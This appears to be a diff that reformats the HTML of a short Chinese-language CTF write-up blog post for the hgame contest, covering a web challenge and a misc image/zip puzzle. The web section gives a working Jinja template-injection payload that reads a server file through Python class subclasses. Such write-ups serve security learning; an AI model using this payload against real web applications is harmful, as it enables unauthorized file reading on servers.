@@ -1,126 +1,70 @@
 <!DOCTYPE html>
 <html lang="en">
-	<head>
-		<meta charset="utf-8">
-		<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-		<meta name="viewport" content="width=device-width, initial-scale=1">
-		 
-			
-  
-    <meta name="twitter:card" content="summary"/>
-    
-      <meta name="twitter:image" content="http://0xf.top/images/avatar.png" />
-    
-  
-  
-  <meta name="twitter:title" content=""/>
-  <meta name="twitter:description" content="web150 本来想考的是jinja模版注入的任意命令执行，然后想了想算了，直接任意文件读取算了，所以最后分值就定了150，权限刚开始忘记设了，直接是root。。。。在比赛中间修了一下，但是还是让可以写shell，最终payload只需要读文件就行了，shell啥的你们想放就放吧。
-/sachabv{{ &#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;./flag&#39;).read() }}  misc 这是啥 首先拿到一个文件，发现都是000，111的，所以我们知道这就是一个图片，将1转换为255，之后反色，或者将1转为0，0转为255，获得验证码得到一个base64字符串，揭秘后为压缩包。暴力破解得到密码hgame，即可得到密码
+<head>
+<meta charset="utf-8"/>
+<meta content="IE=edge,chrome=1" http-equiv="X-UA-Compatible"/>
+<meta content="width=device-width, initial-scale=1" name="viewport"/>
+<meta content="summary" name="twitter:card"/>
+<meta content="http://0xf.top/images/avatar.png" name="twitter:image"/>
+<meta content="" name="twitter:title"/>
+<meta content="web150 本来想考的是jinja模版注入的任意命令执行，然后想了想算了，直接任意文件读取算了，所以最后分值就定了150，权限刚开始忘记设了，直接是root。。。。在比赛中间修了一下，但是还是让可以写shell，最终payload只需要读文件就行了，shell啥的你们想放就放吧。
+/sachabv{{ ''.__class__.__mro__[2].__subclasses__()[40]('./flag').read() }}  misc 这是啥 首先拿到一个文件，发现都是000，111的，所以我们知道这就是一个图片，将1转换为255，之后反色，或者将1转为0，0转为255，获得验证码得到一个base64字符串，揭秘后为压缩包。暴力破解得到密码hgame，即可得到密码
 39.72.183.13
 119.461208 / 35.428588
-118.767413 / 32.041544,118.767413"/>
-  
-    <meta name="twitter:site" content="@ngc7293"/>
-  
-  
-  
-  
-    <meta name="twitter:creator" content="@ngc7293"/>
-  
-
-
-
-		
-		<meta name="author" content="ngc7293">
-		
-		<meta name="generator" content="Hugo 0.36.1" />
-		<title> &middot; ngc7293&#39;s blog</title>
-		<link rel="shortcut icon" href="http://0xf.top/images/favicon.ico">
-		<link rel="stylesheet" href="http://0xf.top/css/style.css">
-		<link rel="stylesheet" href="http://0xf.top/css/highlight.css">
-
-		
-		<link rel="stylesheet" href="http://0xf.top/css/font-awesome.min.css">
-		
-
-		
-		<link href="http://0xf.top/index.xml" rel="alternate" type="application/rss+xml" title="ngc7293&#39;s blog" />
-		
-
-		
-	</head>
-
-    <body>
-       <nav class="main-nav">
-	
-	
-		<a href='http://0xf.top/'> <span class="arrow">←</span>Home</a>
-	
-	<a href='http://0xf.top/posts'>Archive</a>
-	<a href='http://0xf.top/tags'>Tags</a>
-	<a href='http://0xf.top/about'>About</a>
-
-	
-
-	
-	<a class="cta" href="http://0xf.top/index.xml">Subscribe</a>
-	
+118.767413 / 32.041544,118.767413" name="twitter:description"/>
+<meta content="@ngc7293" name="twitter:site"/>
+<meta content="@ngc7293" name="twitter:creator"/>
+<meta content="ngc7293" name="author"/>
+<meta content="Hugo 0.36.1" name="generator"/>
+<title> · ngc7293's blog</title>
+<link href="http://0xf.top/images/favicon.ico" rel="shortcut icon"/>
+<link href="http://0xf.top/css/style.css" rel="stylesheet"/>
+<link href="http://0xf.top/css/highlight.css" rel="stylesheet"/>
+<link href="http://0xf.top/css/font-awesome.min.css" rel="stylesheet"/>
+<link href="http://0xf.top/index.xml" rel="alternate" title="ngc7293's blog" type="application/rss+xml"/>
+</head>
+<body>
+<nav class="main-nav">
+<a href="http://0xf.top/"> <span class="arrow">←</span>Home</a>
+<a href="http://0xf.top/posts">Archive</a>
+<a href="http://0xf.top/tags">Tags</a>
+<a href="http://0xf.top/about">About</a>
+<a class="cta" href="http://0xf.top/index.xml">Subscribe</a>
 </nav>
-
-
-        <section id="wrapper" class="post">
-            <article>
-                <header>
-                    <h1>
-                        
-                    </h1>
-                    <h2 class="headline">
+<section class="post" id="wrapper">
+<article>
+<header>
+<h1>
+</h1>
+<h2 class="headline">
                     Jan 1, 0001 00:00
                     · 15 words
                     · 1 minute read
                       <span class="tags">
-                      
-                      </span>
-                    </h2>
-                </header>
-                
-                  
-                    <div id="toc">
-                      <nav id="TableOfContents">
+</span>
+</h2>
+</header>
+<div id="toc">
+<nav id="TableOfContents">
 <ul>
 <li><a href="#web150">web150</a></li>
 <li><a href="#misc-这是啥">misc 这是啥</a></li>
 </ul>
 </nav>
-                    </div>
-                  
-                
-                <section id="post-body">
-                    
-
+</div>
+<section id="post-body">
 <h1 id="web150">web150</h1>
-
 <p>本来想考的是jinja模版注入的任意命令执行，然后想了想算了，直接任意文件读取算了，所以最后分值就定了150，权限刚开始忘记设了，直接是root。。。。在比赛中间修了一下，但是还是让可以写shell，最终payload只需要读文件就行了，shell啥的你们想放就放吧。</p>
-
 <pre><code class="language-python">/sachabv{{ ''.__class__.__mro__[2].__subclasses__()[40]('./flag').read() }}
 </code></pre>
-
 <h1 id="misc-这是啥">misc 这是啥</h1>
-
 <p>首先拿到一个文件，发现都是000，111的，所以我们知道这就是一个图片，将1转换为255，之后反色，或者将1转为0，0转为255，获得验证码得到一个base64字符串，揭秘后为压缩包。暴力破解得到密码hgame，即可得到密码</p>
-
 <p>39.72.183.13</p>
-
 <p>119.461208 / 35.428588</p>
-
 <p>118.767413 / 32.041544,118.767413</p>
-
-                </section>
-            </article>
-
-            
-                <a class="twitter" href="https://twitter.com/intent/tweet?text=http%3a%2f%2f0xf.top%2fposts%2fhgame_misc%2f -  by @ngc7293"><span class="icon-twitter"> tweet</span></a>
-
+</section>
+</article>
+<a class="twitter" href="https://twitter.com/intent/tweet?text=http%3a%2f%2f0xf.top%2fposts%2fhgame_misc%2f -  by @ngc7293"><span class="icon-twitter"> tweet</span></a>
 <a class="facebook" href="#" onclick="
     window.open(
       'https://www.facebook.com/sharer/sharer.php?u='+encodeURIComponent(location.href),
@@ -128,11 +72,7 @@
       'width=626,height=436');
     return false;"><span class="icon-facebook-rect"> Share</span>
 </a>
-
-            
-
-            
-                <div id="disqus_thread"></div>
+<div id="disqus_thread"></div>
 <script type="text/javascript">
     var disqus_shortname = 'ngc7293s-blog'; 
 
@@ -144,55 +84,32 @@
     })();
 </script>
 <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<footer id="footer">
+<div id="social">
+<a class="symbol" href="https://www.facebook.com/">
+<i class="fa fa-facebook-square"></i>
+</a>
+<a class="symbol" href="https://www.github.com/ngc7292">
+<i class="fa fa-github-square"></i>
+</a>
+<a class="symbol" href="https://www.twitter.com/">
+<i class="fa fa-twitter-square"></i>
+</a>
 </div>
-            
-
-            
-
-            <footer id="footer">
+<p class="small">
     
-        <div id="social">
-
-	
-	
-    <a class="symbol" href="https://www.facebook.com/">
-        <i class="fa fa-facebook-square"></i>
-    </a>
-    
-    <a class="symbol" href="https://www.github.com/ngc7292">
-        <i class="fa fa-github-square"></i>
-    </a>
-    
-    <a class="symbol" href="https://www.twitter.com/">
-        <i class="fa fa-twitter-square"></i>
-    </a>
-    
-
-
-</div>
-
-    
-    <p class="small">
-    
-       © Copyright 2018 <i class="fa fa-heart" aria-hidden="true"></i> ngc7293
+       © Copyright 2018 <i aria-hidden="true" class="fa fa-heart"></i> ngc7293
     
     </p>
-    <p class="small">
+<p class="small">
         Powered by <a href="http://www.gohugo.io/">Hugo</a> Theme By <a href="https://github.com/nodejh/hugo-theme-cactus-plus">nodejh</a>
-    </p>
+</p>
 </footer>
-
-        </section>
-
-        <script src="http://0xf.top/js/jquery-2.2.4.min.js"></script>
+</section>
+<script src="http://0xf.top/js/jquery-2.2.4.min.js"></script>
 <script src="http://0xf.top/js/main.js"></script>
 <script src="http://0xf.top/js/highlight.min.js"></script>
 <script>hljs.initHighlightingOnLoad();</script>
-
-
-
-
-  
 <script>
 (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
 (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
@@ -202,10 +119,5 @@ m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
 ga('create', 'ngc7293', 'auto');
 ga('send', 'pageview');
 </script>
-
-
-
-
-
-    </body>
+</body>
 </html>
